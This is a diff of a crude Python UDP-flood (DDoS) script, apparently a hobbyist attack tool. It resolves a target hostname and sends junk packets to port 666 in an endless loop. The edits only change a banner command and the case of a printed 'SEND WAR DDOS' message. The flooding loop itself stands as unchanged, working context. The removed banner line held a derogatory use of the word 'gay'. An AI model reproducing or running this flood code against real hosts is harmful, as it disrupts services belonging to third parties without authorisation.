@@ -19,7 +19,7 @@ ip = socket.gethostbyname(target)
 port = 666
 joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
 os.system("clear")
-os.system("toilet -f mono12 gay Loading")
+os.system("toilet -f mono12 Loading | lolcat")
 print("Loading{~~~ }5%")
 time.sleep(3)
 print("Loading{~~~~~~ }26%")
@@ -34,4 +34,4 @@ os.system("figlet Attack_Starting")
 while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-     print(port,"<=== ! send war ddos ama ! ===>",ip)
+     print(port,"<=== ! SEND WAR DDOS AMA ! ===>",ip)
